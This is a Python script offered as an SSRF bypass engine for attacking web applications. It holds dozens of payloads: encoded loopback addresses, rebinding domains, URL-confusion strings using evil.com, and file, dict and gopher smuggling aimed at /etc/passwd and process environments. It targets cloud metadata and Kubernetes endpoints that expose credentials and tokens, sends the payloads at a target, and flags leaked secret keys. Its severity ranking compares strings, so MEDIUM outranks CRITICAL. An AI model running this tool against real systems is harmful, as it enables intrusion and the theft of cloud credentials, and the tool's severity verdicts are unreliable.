#!/usr/bin/env python3
"""
ssrf_engine.py — Comprehensive SSRF Bypass Engine

50+ bypass techniques for IP filtering, redirect chains, protocol smuggling.
Auto-detects SSRF-able parameters and tests all bypass formats.

Usage:
    python3 ssrf_engine.py --url https://target.com/fetch --param url \
        --callback https://INTERACTSH_URL --auth "Bearer TOKEN"
"""
import json
import os
import re
import socket
import struct
import time
from pathlib import Path
from urllib.parse import urlparse, quote

# ── SSRF Bypass IP Formats ────────────────────────────────────────────────────

def _ip_to_decimal(ip: str) -> str:
    """Convert IP to decimal: 127.0.0.1 → 2130706433"""
    parts = [int(p) for p in ip.split(".")]
    return str(struct.unpack("!I", bytes(parts))[0])

def _ip_to_hex(ip: str) -> str:
    """Convert IP to hex: 127.0.0.1 → 0x7f000001"""
    parts = [int(p) for p in ip.split(".")]
    return "0x" + "".join(f"{p:02x}" for p in parts)

def _ip_to_octal(ip: str) -> str:
    """Convert IP to octal: 127.0.0.1 → 0177.0.0.01"""
    parts = [int(p) for p in ip.split(".")]
    return ".".join(f"0{oct(p)[2:]}" for p in parts)

def _ip_to_ipv6(ip: str) -> str:
    """Convert to IPv6-mapped: 127.0.0.1 → [::ffff:127.0.0.1]"""
    return f"[::ffff:{ip}]"


# ── Cloud Metadata Endpoints ──────────────────────────────────────────────────

CLOUD_METADATA = {
    "aws_imdsv1": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "description": "AWS IMDSv1 metadata",
        "high_value": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        ],
        "severity": "CRITICAL",
    },
    "aws_imdsv2": {
        "url": "http://169.254.169.254/latest/api/token",
        "description": "AWS IMDSv2 (requires PUT with header)",
        "method": "PUT",
        "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        "severity": "CRITICAL",
    },
    "gcp": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "description": "GCP metadata",
        "headers": {"Metadata-Flavor": "Google"},
        "high_value": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
        "severity": "CRITICAL",
    },
    "azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "description": "Azure IMDS",
        "headers": {"Metadata": "true"},
        "high_value": [
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "severity": "CRITICAL",
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "description": "DigitalOcean metadata",
        "high_value": [
            "http://169.254.169.254/metadata/v1/user-data",
        ],
        "severity": "HIGH",
    },
    "kubernetes": {
        "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        "description": "Kubernetes API",
        "severity": "CRITICAL",
    },
}

# ── SSRF Parameter Indicators ─────────────────────────────────────────────────

SSRF_PARAMS = [
    "url", "uri", "path", "redirect", "redirect_uri", "redirect_url",
    "callback", "callback_url", "return", "return_url", "next", "next_url",
    "dest", "destination", "target", "link", "feed", "host", "site",
    "html", "page", "view", "content", "reference", "ref", "src",
    "image", "image_url", "img", "img_url", "icon", "icon_url",
    "avatar", "avatar_url", "photo", "photo_url", "picture",
    "proxy", "proxy_url", "fetch", "fetch_url", "load", "load_url",
    "remote", "remote_url", "request", "request_url", "domain",
    "webhook", "webhook_url", "api", "api_url", "endpoint",
    "file", "file_url", "document", "document_url", "pdf", "pdf_url",
    "import", "import_url", "export", "data", "data_url",
]


class SSRFEngine:
    """Comprehensive SSRF tester with bypass techniques."""

    def __init__(self):
        self.findings = []

    def generate_bypass_urls(self, target_ip: str = "169.254.169.254",
                              target_port: int = 80,
                              callback_url: str = "") -> list[dict]:
        """Generate 50+ bypass variants for a target IP."""
        bypasses = []

        # ── IP format bypasses ─────────────────────────────────────────
        bypasses.extend([
            {"payload": f"http://{target_ip}/", "technique": "direct_ip"},
            {"payload": f"http://{_ip_to_decimal(target_ip)}/", "technique": "decimal_ip"},
            {"payload": f"http://{_ip_to_hex(target_ip)}/", "technique": "hex_ip"},
            {"payload": f"http://{_ip_to_octal(target_ip)}/", "technique": "octal_ip"},
            {"payload": f"http://{_ip_to_ipv6(target_ip)}/", "technique": "ipv6_mapped"},
            {"payload": f"http://[::1]/", "technique": "ipv6_localhost"},
            {"payload": f"http://0x7f.0x0.0x0.0x1/", "technique": "hex_dotted"},
            {"payload": f"http://0177.0.0.01/", "technique": "octal_dotted"},
            {"payload": f"http://0/", "technique": "zero_ip"},
            {"payload": f"http://127.1/", "technique": "short_localhost"},
            {"payload": f"http://127.0.1/", "technique": "short_localhost_2"},
            {"payload": f"http://127.127.127.127/", "technique": "alt_loopback"},
        ])

        # ── DNS rebinding / special domains ────────────────────────────
        bypasses.extend([
            {"payload": f"http://localtest.me/", "technique": "dns_localtest"},
            {"payload": f"http://spoofed.burpcollaborator.net/", "technique": "dns_burp"},
            {"payload": f"http://nip.io/", "technique": "dns_nip"},
            {"payload": f"http://127.0.0.1.nip.io/", "technique": "nip_localhost"},
            {"payload": f"http://customer.{target_ip}.nip.io/", "technique": "nip_target"},
            {"payload": f"http://www.oastify.com/", "technique": "dns_oastify"},
        ])

        # ── URL parsing confusion ──────────────────────────────────────
        bypasses.extend([
            {"payload": f"http://evil.com@{target_ip}/", "technique": "url_userinfo"},
            {"payload": f"http://evil.com%40{target_ip}/", "technique": "url_encoded_at"},
            {"payload": f"http://{target_ip}%23.evil.com/", "technique": "url_fragment"},
            {"payload": f"http://{target_ip}%2523.evil.com/", "technique": "double_encode"},
            {"payload": f"http://evil.com#{target_ip}", "technique": "hash_bypass"},
            {"payload": f"http://{target_ip}\\@evil.com/", "technique": "backslash_bypass"},
            {"payload": f"https://evil.com/.{target_ip}/", "technique": "dot_bypass"},
        ])

        # ── Protocol smuggling ─────────────────────────────────────────
        bypasses.extend([
            {"payload": f"file:///etc/passwd", "technique": "file_protocol"},
            {"payload": f"file:///etc/hosts", "technique": "file_hosts"},
            {"payload": f"file:///proc/self/environ", "technique": "file_environ"},
            {"payload": f"file:///proc/self/cmdline", "technique": "file_cmdline"},
            {"payload": f"dict://{target_ip}:{target_port}/info", "technique": "dict_protocol"},
            {"payload": f"gopher://{target_ip}:{target_port}/_GET%20/%20HTTP/1.0%0d%0a%0d%0a",
             "technique": "gopher_protocol"},
        ])

        # ── Redirect chain bypasses ────────────────────────────────────
        if callback_url:
            bypasses.extend([
                {"payload": callback_url, "technique": "oob_callback"},
                {"payload": f"{callback_url}?ssrf=1", "technique": "oob_tagged"},
            ])

        # ── Cloud metadata specific ────────────────────────────────────
        for cloud, meta in CLOUD_METADATA.items():
            bypasses.append({
                "payload": meta["url"],
                "technique": f"cloud_{cloud}",
                "severity": meta["severity"],
            })
            for hv in meta.get("high_value", []):
                bypasses.append({
                    "payload": hv,
                    "technique": f"cloud_{cloud}_creds",
                    "severity": "CRITICAL",
                })

        return bypasses

    def detect_ssrf_params(self, urls: list[str]) -> list[dict]:
        """Scan URL list for SSRF-able parameters."""
        findings = []
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            for param_pair in parsed.query.split("&"):
                if "=" not in param_pair:
                    continue
                param_name = param_pair.split("=")[0].lower()
                if param_name in SSRF_PARAMS:
                    findings.append({
                        "url": url,
                        "param": param_name,
                        "risk": "high" if param_name in (
                            "url", "uri", "redirect", "callback", "proxy",
                            "fetch", "webhook", "import"
                        ) else "medium",
                    })
        return findings

    def test_ssrf(self, base_url: str, param: str,
                  headers: dict = None, callback_url: str = "",
                  method: str = "GET") -> dict:
        """Test a specific URL+param for SSRF with all bypass techniques."""
        import requests

        headers = headers or {}
        bypasses = self.generate_bypass_urls(callback_url=callback_url)
        results = {
            "url": base_url,
            "param": param,
            "tested": len(bypasses),
            "hits": [],
            "ssrf_confirmed": False,
            "severity": "LOW",
        }

        # Get baseline response
        try:
            baseline = requests.get(base_url, headers=headers, timeout=10,
                                   allow_redirects=False)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            baseline_len = 0
            baseline_status = 0

        for bypass in bypasses:
            payload = bypass["payload"]
            technique = bypass["technique"]

            try:
                if method.upper() == "GET":
                    sep = "&" if "?" in base_url else "?"
                    test_url = f"{base_url}{sep}{param}={quote(payload, safe='')}"
                    resp = requests.get(test_url, headers=headers, timeout=8,
                                       allow_redirects=False)
                else:
                    resp = requests.post(base_url, headers=headers,
                                        data={param: payload}, timeout=8,
                                        allow_redirects=False)

                # Detect SSRF indicators
                hit = False
                reasons = []

                # Different response length = server processed the URL
                if abs(len(resp.text) - baseline_len) > 100:
                    reasons.append("response_length_change")
                    hit = True

                # Internal IP/metadata content in response
                internal_markers = [
                    "ami-id", "instance-id", "security-credentials",
                    "root:x:0:", "/bin/bash", "HOSTNAME=", "PATH=",
                    "iam", "AccessKeyId", "SecretAccessKey",
                    "compute/v1", "metadata", "project-id",
                ]
                for marker in internal_markers:
                    if marker in resp.text:
                        reasons.append(f"internal_data_leaked:{marker}")
                        hit = True
                        results["severity"] = "CRITICAL"

                # Status code change from error to success
                if baseline_status >= 400 and resp.status_code < 400:
                    reasons.append("status_code_change")
                    hit = True

                # Timing difference (> 2s could indicate internal request)
                if resp.elapsed.total_seconds() > 2:
                    reasons.append("slow_response")

                if hit:
                    results["hits"].append({
                        "technique": technique,
                        "payload": payload,
                        "status": resp.status_code,
                        "body_length": len(resp.text),
                        "body_preview": resp.text[:300],
                        "reasons": reasons,
                        "severity": bypass.get("severity", "HIGH"),
                    })

            except requests.exceptions.Timeout:
                # Timeout on internal request = possible blind SSRF
                results["hits"].append({
                    "technique": technique,
                    "payload": payload,
                    "status": 0,
                    "reasons": ["request_timeout_possible_blind_ssrf"],
                    "severity": "MEDIUM",
                })
            except Exception:
                continue

            # Rate limit
            time.sleep(0.2)

        if results["hits"]:
            results["ssrf_confirmed"] = True
            max_sev = max(h.get("severity", "LOW") for h in results["hits"])
            results["severity"] = max_sev
            self.findings.append(results)

        return results

    def save_findings(self, target: str) -> None:
        """Save SSRF findings to disk."""
        out_dir = Path(f"findings/{target}/ssrf")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"ssrf_results_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSRF Bypass Engine")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="SSRF-able parameter name")
    parser.add_argument("--auth", default="", help="Authorization header")
    parser.add_argument("--callback", default="", help="OOB callback URL (interactsh)")
    parser.add_argument("--method", default="GET", help="HTTP method")
    parser.add_argument("--target", default="", help="Target name for saving")
    args = parser.parse_args()

    headers = {}
    if args.auth:
        headers["Authorization"] = args.auth

    engine = SSRFEngine()
    result = engine.test_ssrf(args.url, args.param, headers,
                             args.callback, args.method)

    if result["ssrf_confirmed"]:
        print(f"\n[!!!] SSRF CONFIRMED — {len(result['hits'])} bypass(es) worked")
        print(f"  Severity: {result['severity']}")
        for hit in result["hits"][:5]:
            print(f"  ✅ {hit['technique']}: {hit['payload'][:60]}")
            print(f"     Reasons: {', '.join(hit['reasons'])}")
    else:
        print(f"\n[-] No SSRF detected ({result['tested']} techniques tested)")

    if args.target:
        engine.save_findings(args.target)
